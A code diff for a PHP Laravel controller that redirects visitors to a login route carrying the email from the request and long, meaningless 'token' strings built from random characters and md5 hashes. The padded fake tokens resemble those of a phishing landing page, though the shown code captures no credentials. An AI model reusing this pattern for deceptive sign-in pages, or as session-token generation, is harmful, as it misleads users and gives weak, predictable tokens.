@@ -9,17 +9,27 @@ use Session;
 class HomeController extends Controller
 {
     public function index() {
-        $url=$this->random_number().$this->random_number().$this->random_number().$this->random_number().$this->random_number().$this->random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));
+        // $url=$this->random_number().$this->random_number().$this->random_number().$this->random_number().$this->random_number().$this->random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));
         // header('location:'.$url);
-        if(isset($_GET['email'])) {
-                $email = $_GET['email'];          
-                $praga = rand();
-                $praga = md5($praga);
-                return redirect()->route('login', ['clientId'=>$praga, 'session' => $praga,'protectedtoken' =>  $url, 'email' => $email]);                      
+        // if(isset($_GET['email'])) {
+        //         $email = $_GET['email'];          
+        //         $praga = rand();
+        //         $praga = md5($praga);
+        //         return redirect()->route('login', ['clientId'=>$praga, 'session' => $praga,'protectedtoken' =>  $url, 'email' => $email]);                      
         
-        }        
+        // }        
         return view('welcome');
     }
+
+    public function login(Request $req) {
+        // dd($req->all());
+        $url=$this->random_number().$this->random_number().$this->random_number().$this->random_number().$this->random_number().$this->random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));
+        $praga = rand();
+        $praga = md5($praga);
+
+        return redirect()->route('login', ['clientId'=>$praga, 'session' => $req->input('session_token'),'session_token' =>  $url, 'email' => $req->input('email')]);                      
+    }
+
     public function random_number(){
         $numbers=array(0,1,2,3,4,5,6,7,8,9,'A','b','C','D','e','F','G','H','i','J','K','L');
         $key=array_rand($numbers);
